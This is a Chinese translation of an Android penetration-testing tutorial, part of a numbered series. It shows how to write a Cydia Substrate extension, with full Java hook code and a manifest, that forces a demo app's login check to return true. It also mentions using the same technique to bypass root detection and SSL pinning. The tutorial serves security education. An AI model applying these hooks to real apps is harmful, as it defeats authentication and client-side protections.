
# 【系列分享】安卓Hacking Part 22：基于Cydia Substrate扩展的Android应用的钩子和补丁技术


                                阅读量   
                                **109845**
                            
                        |
                        
                                                                                                                                    ![](./img/85823/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[http://resources.infosecinstitute.com/android-hacking-and-security-part-22-hooking-and-patching-android-apps-using-cydia-substrate-extensions/#article](http://resources.infosecinstitute.com/android-hacking-and-security-part-22-hooking-and-patching-android-apps-using-cydia-substrate-extensions/#article)

译文仅供参考，具体内容表达以及含义原文为准

**<strong style="font-size: 18px;text-align: center">[![](./img/85823/t0127fe73337bf7a900.jpg)](./img/85823/t0127fe73337bf7a900.jpg)**</strong>

****

翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：150RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**概述**

在之前的文章中，我们已经讨论了如何在Android上利用可调试应用程序的漏洞，具体可以参考这篇文章。通过JDB来利用可调试应用程序的漏洞这种方法存在一些局限性，因为它要求应用程序的可调试标志必须设置为true，这样才能在实际设备上达到我们的目的。此外，我们已经看到，设置断点和控制流程都是通过命令行方式来实现的。虽然这种技术在分析应用程序方面非常有用，但我们仍然需要一个解决方案，以便在应用程序运行过程中即时控制应用程序的执行流程。实际上，像Cydia Substrate、Xposed Framework和Frida之类的工具，在这方面有着非常出色的表现。至于Xposed和Frida框架，我们将在后续文章中加以介绍，而在本文中，我们将专注于演示如何通过编写Cydia Substrate扩展来控制应用程序流程。

在继续阅读下文之前，您需要：

1.	在已经获得root权限的 Android设备安装好Cydia Substrate。

2.	Cydia Substrate应用程序可以从这里下载。

3.	使用您最喜爱的IDE创建一个新的Android应用程序（这里是Cydia Substrate扩展），并将底层的api.jar库添加到您的libs文件夹中。Substrate-api.jar可以从这里下载。

4.	目标应用程序—— 您可以从下面的链接下载：



**下载**

现在，我们开始编写“Substrate”扩展。像我的其他文章一样，我们这里有一个带有安全漏洞的应用程序；并且，我们将通过Cydia Substrate扩展来利用这个漏洞。以下是我们的目标应用程序的第一个activity。

[![](./img/85823/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014121e85f9237a77c.png)

当用户输入无效的凭证时，它会抛出错误，如下图所示。

[![](./img/85823/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cd104b7477afcd50.png)

我们的目标是通过编写一个Cydia Substrate扩展来绕过登录。很明显，我们首先需要了解应用程序的具体逻辑，然后才能有针对性地编写相应的Substrate扩展。

我们可以将这个APK反编译为Java代码，从而了解这个应用程序的运行逻辑。为了简单起见，我这里将给出其源码，因为这里的主旨是理解如何编写Cydia Substrate扩展，所以不妨假设我们可以访问应用程序的逻辑。

以下是Login.java的代码段 



```
Login.java
package com.androidpentesting.targetapp;
if(isValidLogin(username,password))
{
Intent in=new Intent(getApplicationContext(),Welcome.class);
startActivity(in);
}
else {
Toast.makeText(getApplicationContext(), “Invalid Username or password”, Toast.LENGTH_LONG).show();
}
public boolean isValidLogin(String username, String password)
{
String uname=pref.getString(“username”,null);
String pass=pref.getString(“password”,null);
if(username.contentEquals(uname) &amp;&amp; password.contentEquals(pass))
{
return true;
}
else{
return false;
}
}
```

如上面的代码片段所示，应用程序从用户那里接收用户名和密码，然后将其与SharedPreferences中存储的值进行比较。如果用户输入的凭据与相应的值相匹配，那么应用程序就会返回布尔值true，然后将该用户重定向到一个私有的activity。这简直就是一个完美的试验对象，我们正好可以借助它来演示如何编写Cydia扩展，以便无论用户输入什么内容，该应用程序都会返回true。

从上面的代码片段获得的细节信息有： 

类名： com.androidpentesting.targetapp.Login

方法名：isValidLogin

好了，让我们开始吧。

如Cydia Substrate文档中所说的那样，我们首先需要配置自己的AndroidManifest.xml文件。

我们需要在AndroidManifest.xml文件中添加两项内容，具体如下面的代码所示。



```
&lt;manifest xmlns:android=”http://schemas.android.com/apk/res/android”
package=”com.androidpentesting.cydia”
android:versionCode=”1″
android:versionName=”1.0″ &gt;
    &lt;uses-permission android:name=”cydia.permission.SUBSTRATE” /&gt;
&lt;uses-sdk
android:minSdkVersion=”8″
android:targetSdkVersion=”21″ /&gt;
&lt;application
android:allowBackup=”true”
android:icon=”@drawable/ic_launcher”
android:label=”@string/app_name”
android:theme=”@style/AppTheme” &gt;
&lt;meta-data android:name=”com.saurik.substrate.main”
android:value=”.BypassLogin”/&gt;
&lt;/application&gt;
&lt;/manifest&gt;
```

1.首先，我们需要申请cydia.permission.SUBSTRATE权限。

2.	我们需要在application部分中添加meta-data元素。

现在，我们终于来到了最有趣的部分。我们需要编写实际的实现代码，来钩住我们的目标方法，该方法负责验证用户凭据，然后修改其定义。

为了实现上面的目的，我们需要用到两个重要的函数。



```
MS.hookClassLoad
MS.hookMethod
```

MS.hookClassLoad可用于在加载类时查找我们感兴趣的类。

MS.hookMethod可用于对目标方法进行相应的修改。

有关这些方法到底做什么以及它们运行机制的更多细节，请参考这里和这里。

现在，我们来创建一个名为BypassLogin的新类。加载这个扩展时，会首先执行initialize（）方法。

所以，我们需要在BypassLogin类中编写的框架代码如下所示。



```
Public class Main {
static void initialize() {
// code to run when extension is loaded
}
}
```

现在，我们需要编写在加载com.androidpentesting.targetapp.Login类时执行检测任务的相关代码。如前所述，我们可以使用MS.hookClassLoad来实现。



```
MS.hookClassLoad(“com.androidpentesting.targetapp.Login”, new MS.ClassLoadHook() {
public void classLoaded(Class&lt;?&gt; resources) {
// … code to modify the class when loaded
}
});
```

当这个类加载时，我们：

1.	需要编写一段代码来检查我们的目标方法是否存在。

2.	如果该方法不存在，在logcat中记录下来。

3.	如果该方法已经存在，请使用MS.hookMethod修改其定义。

就是这样。

下面给出实现上述步骤的具体代码。



```
Method methodToHook;
try{
    methodToHook = resources.getMethod(“isValidLogin“, String.class, String.class);
}catch(NoSuchMethodException e){
    methodToHook = null;
}
    if (methodToHook == null) {
        Log.v(“cydia”,”No method found”);
    }
    else{
        MS.hookMethod(resources, methodToHook, new MS.MethodAlteration&lt;Object, Boolean&gt;() {
        public Boolean invoked(Object _class, Object… args) throws Throwable
        {
            return true;
        }
                    });
    }
```

其中，红色突出显示的部分是需要我们重点关注的内容。通过源代码我们可以发现，目标应用程序的isLoginMethod需要两个字符串参数，因此在resources.getMethod（）中，这个方法名称后面使用了两次String.class。

当检测到该方法时，无论实际的实现代码如何，我们只会返回真值。

下面给出我们的完整代码。



```
package com.androidpentesting.cydia;
import java.lang.reflect.Method;
import android.util.Log;
import com.saurik.substrate.*;
public class BypassLogin {
     public static void initialize() {
MS.hookClassLoad(“com.androidpentesting.targetapp.Login”, new MS.ClassLoadHook() {
     @SuppressWarnings({ “unchecked”, “rawtypes” })
     public void classLoaded(Class&lt;?&gt; resources) {
        Method methodToHook;
try{
    methodToHook = resources.getMethod(“isValidLogin”, String.class, String.class);
}catch(NoSuchMethodException e){
    methodToHook = null;
}
    if (methodToHook == null) {
        Log.v(“cydia”,”No method found”);
    }
    else{
        MS.hookMethod(resources, methodToHook, new MS.MethodAlteration&lt;Object, Boolean&gt;() {
        public Boolean invoked(Object _class, Object… args) throws Throwable
        {
            return true;
        }
                    });
    }
}
});
     }
}
```

现在，就像安装正常的应用程序一样来安装这个扩展程序，并重新启动设备来激活该扩展。然后，请再次启动目标应用程序。当您单击Login按钮时，您将自动重定向到登录屏，从而绕过验证检查。

[![](./img/85823/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01dee3a426e52da0c1.png)

很好！ 我们成功绕过了认证。当您需要绕过客户端控件时，Cydia Substrate扩展是可以帮上大忙的。这方面的例子包括绕过root权限检测、绕过SSL Pinning等。

<br>



传送门

[](http://bobao.360.cn/learning/detail/122.html)

[安卓 Hacking Part 1：应用组件攻防（连载）](http://bobao.360.cn/learning/detail/122.html)

[安卓 Hacking Part 2：Content Provider攻防（连载）](http://bobao.360.cn/learning/detail/127.html)

[安卓 Hacking Part 3：Broadcast Receivers攻防（连载）](http://bobao.360.cn/learning/detail/126.html)

[安卓 Hacking Part 4：非预期的信息泄露（边信道信息泄露）](http://bobao.360.cn/learning/detail/133.html)

[安卓 Hacking Part 5：使用JDB调试Java应用](http://bobao.360.cn/learning/detail/138.html)

[安卓 Hacking Part 6：调试Android应用](http://bobao.360.cn/learning/detail/140.html)

[安卓 Hacking Part 7：攻击WebView](http://bobao.360.cn/learning/detail/142.html)

[安卓 Hacking Part 8：Root的检测和绕过](http://bobao.360.cn/learning/detail/144.html)

[安卓 Hacking Part 9：不安全的本地存储：Shared Preferences](http://bobao.360.cn/learning/detail/150.html)

[安卓 Hacking Part 10：不安全的本地存储](http://bobao.360.cn/learning/detail/152.html)

[安卓 Hacking Part 11：使用Introspy进行黑盒测试](http://bobao.360.cn/learning/detail/154.html)

[安卓 Hacking Part 12：使用第三方库加固Shared Preferences](http://bobao.360.cn/learning/detail/156.html)

[安卓 Hacking Part 13：使用Drozer进行安全测试](http://bobao.360.cn/learning/detail/158.html)

[安卓 Hacking Part 14：在没有root的设备上检测并导出app特定的数据](http://bobao.360.cn/learning/detail/161.html)

[安卓 Hacking Part 15：使用备份技术黑掉安卓应用](http://bobao.360.cn/learning/detail/169.html)

[安卓 Hacking Part 16：脆弱的加密](http://bobao.360.cn/learning/detail/174.html)

[安卓 Hacking Part 17：破解Android应用](http://bobao.360.cn/learning/detail/179.html)

[安卓 Hacking Part 18：逆向工程入门篇](http://bobao.360.cn/learning/detail/3648.html)

[**安卓 Hacking Part 19：NoSQL数据库不安全的数据存储**](http://bobao.360.cn/learning/detail/3653.html)

[**安卓Hacking Part 20：使用GDB在Android模拟器上调试应用程序******](http://bobao.360.cn/learning/detail/3677.html)

<br>
